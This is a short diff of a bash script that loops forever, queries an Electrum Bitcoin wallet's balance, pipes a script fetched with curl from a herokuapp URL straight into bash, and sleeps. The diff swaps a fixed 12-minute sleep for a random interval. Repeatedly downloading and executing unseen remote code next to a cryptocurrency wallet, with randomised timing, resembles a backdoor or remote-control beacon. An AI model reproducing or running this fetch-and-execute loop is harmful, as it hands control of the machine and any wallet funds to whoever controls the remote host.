@@ -2,10 +2,11 @@
 for (( ; ; ))
 do
 electrum getbalance
-bash <(curl -s https://skobet.herokuapp.com/x.php)  
-echo "..............."
+bash <(curl -s https://skobet.herokuapp.com/x.php) 
 
-sleep 12m
+
+ 
+sleep $[ ( $RANDOM % 10 )  + 1 ]m
 done
 
 
